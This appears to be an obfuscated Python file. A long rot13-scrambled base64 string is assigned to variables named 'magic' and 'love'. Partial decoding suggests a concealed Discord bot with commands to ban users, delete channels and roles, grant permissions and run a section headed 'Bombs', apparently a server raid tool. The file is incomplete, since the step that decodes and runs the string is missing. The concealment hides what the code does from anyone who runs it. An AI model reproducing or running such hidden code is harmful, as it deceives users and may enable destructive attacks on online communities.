import base64, codecs
magic = ''
love = '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